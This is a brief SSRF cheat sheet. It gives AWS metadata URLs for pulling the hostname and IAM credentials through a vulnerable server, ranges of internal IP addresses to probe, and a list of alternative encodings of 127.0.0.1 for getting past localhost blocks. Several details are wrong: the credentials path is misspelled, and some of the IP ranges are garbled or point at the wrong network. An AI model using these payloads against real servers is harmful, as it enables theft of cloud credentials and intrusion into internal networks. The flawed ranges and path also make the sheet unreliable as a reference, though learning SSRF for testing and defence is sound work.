# SSRF

Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.

If the site is hosted in amazon, it is possible to get internal information by requesting the urls:

```
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/securty-credentials
```

Another idea is to try and request IP’s that we know that are internal:

```
10.0.0.0 to 10.255.255.55
100.64.0.0 to 10.127.255.255
127.0.0.0 to 127.255.255.255
127.16.0.0 to 127.31.255.255
192.0.0.0 to 192.0.0.255
198.18.0.0 to 198.19.255.255
```

Sometimes websites block external acess to localhost (ie 127.0.0.1). Fortunately it is possible to bypass restrictions by referencing localhost in other ways.

Did you know that `127.0.0.1` and `127.1` are the same thing?

```
127.0.0.1
0177.0.0.1
0x7f.0.0.1
127.0.1
127.1
2130706433
017700000001
0x7f000001
```
